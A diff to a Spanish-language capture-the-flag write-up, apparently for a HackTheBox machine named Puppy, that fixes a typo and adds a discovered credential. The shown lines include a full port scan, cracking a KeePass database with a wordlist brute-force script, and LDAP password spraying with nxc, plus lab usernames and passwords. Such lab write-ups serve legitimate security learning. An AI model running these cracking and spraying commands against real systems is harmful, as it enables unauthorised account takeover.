@@ -1,4 +1,4 @@
-levi.james / KingofAkron2025!
+levi.james:KingofAkron2025!
 ## Reconocimiento
 `rustscan -a $IP --ulimit 1000 -r 1-65535 -- -A -sCV -oG allPorts`
 
@@ -82,8 +82,11 @@ Usaremos `./keepas4brute.sh recovery.kdbx /usr/share/wordlists/rockyou.txt`
 La contraseña que nos devuelve es `liverpool`
 
 Dentro del archivo encontramos contraseñas, que las añadimos a un archivo y lo guardamos
-Y haremos fuerza bruata a los primeros usuarios encontrados
+Y haremos fuerza bruta a los primeros usuarios encontrados
 `nxc ldap $IP -u users.txt -p pass.txt --continu-on-success | grep '[+]'`
+Nos encuentra el siguiente user
+`[+] PUPPY.HTB\ant.edwards:Antman2025!`
+
 
 
 
